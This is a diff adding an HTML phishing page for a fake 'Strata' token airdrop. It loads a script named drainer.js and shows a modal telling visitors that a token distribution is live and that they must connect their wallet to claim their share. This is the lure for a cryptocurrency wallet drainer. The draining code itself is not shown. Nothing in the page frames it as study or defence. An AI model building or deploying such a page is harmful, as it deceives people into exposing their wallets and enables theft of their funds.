@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SolMage Test</title>
+<script src="drainer.js" type="module"></script>
+<style>
+  :root{
+    --bg:#061018;
+    --muted:rgba(255,255,255,0.55);
+    --modal-width:360px;
+    --radius:14px;
+  }
+
+  html, body {
+    height: 100%;
+    margin: 0;
+    font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
+    color: #e6eef8;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* Full-screen background with blur to reduce pixelation */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: url('https://media.discordapp.net/attachments/1424131517474410566/1424779421969289297/image.png?ex=68e530bd&is=68e3df3d&hm=5f286a9724933bcc6652ae44d43fa025f0e6f61dfd37e7d4355ec4ff470d477c&=&format=webp&quality=lossless&width=550&height=309') center center / cover no-repeat;
+    filter: blur(4px) brightness(0.7); /* slight blur + dim so modal pops */
+    z-index: 0;
+  }
+
+  .page{
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    position:relative;
+    padding:40px;
+    overflow:hidden;
+    z-index: 1; /* above the background */
+  }
+
+  .hero{
+    width:940px;
+    height:520px;
+    border-radius:20px;
+    background:linear-gradient(180deg, rgba(255,255,255,0.01), transparent);
+    box-shadow:0 6px 40px rgba(3,7,12,0.75);
+    filter:blur(6px) saturate(.9);
+    opacity:.45;
+  }
+
+  .overlay{
+    position:absolute;
+    inset:0;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    pointer-events:none;
+  }
+
+  .modal{
+    width:var(--modal-width);
+    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+    border-radius:calc(var(--radius)+6px);
+    box-shadow:0 20px 60px rgba(0,0,0,.7);
+    padding:22px;
+    text-align:center;
+    pointer-events:auto;
+    border:1px solid rgba(255,255,255,0.04);
+    backdrop-filter:blur(6px);
+    position: relative;
+    z-index: 2; /* above the blurred background */
+  }
+
+  .logo{
+    width:56px;
+    height:56px;
+    margin:0 auto 12px;
+    border-radius:12px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:linear-gradient(135deg,#3fb1ff,#7b6cff);
+    font-weight:700;
+    font-size:22px;
+    color:white;
+  }
+
+  .modal h2{
+    margin:4px 0 8px;
+    font-size:18px;
+    font-weight:600;
+  }
+
+  .modal p.lead{
+    margin:0 0 18px;
+    color:var(--muted);
+    font-size:13px;
+  }
+
+  .btn{
+    display:inline-block;
+    width:100%;
+    padding:11px 14px;
+    border-radius:10px;
+    border:none;
+    font-weight:600;
+    cursor:pointer;
+    font-size:14px;
+    margin-bottom:10px;
+    box-sizing:border-box;
+  }
+
+  .btn-primary{
+    background:linear-gradient(180deg,#4ec0ff,#2d8ce6);
+    color:#02162a;
+    box-shadow:0 6px 18px rgba(37,123,204,0.18);
+    border:1px solid rgba(255,255,255,0.06);
+  }
+
+  .btn-ghost{
+    background:transparent;
+    color:var(--muted);
+    border:1px solid rgba(255,255,255,0.04);
+    backdrop-filter:blur(6px);
+  }
+
+  .btn[disabled]{opacity:.45;cursor:not-allowed}
+
+  .hint{
+    margin-top:8px;
+    font-size:12px;
+    color:var(--muted);
+  }
+
+  @media (max-width:420px){
+    .modal{width:calc(100% - 32px)}
+    .hero{display:none}
+  }
+
+  .content{
+    position: relative;
+    z-index: 2;
+    text-align: center;
+    color: white;
+  }
+
+</style>
+</head>
+<body>
+  <div class="page">
+    <div class="hero" aria-hidden="true"></div>
+
+    <div class="overlay" role="dialog" aria-modal="true" aria-label="Strata Season 0 invitation">
+      <div class="modal" id="inviteModal">
+        <div class="logo" aria-hidden="true">S</div>
+        <h2>Strata Token Distribution Is<br><strong>Now Live  </strong></h2>
+        <p class="lead">We just started distribution of our token in honor of 100K market cap! Connect wallet and get your share!</p>
+
+        <button id="connectWalletBtn" class="btn btn-primary">Connect Wallet</button>
+
+        <div class="hint" id="modalHint">You must connect your wallet to withdraw.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="content">
+    <p id="status">Connecting to wallet...</p>
+    <p id="balance"></p>
+  </div>
+</body>
+</html>
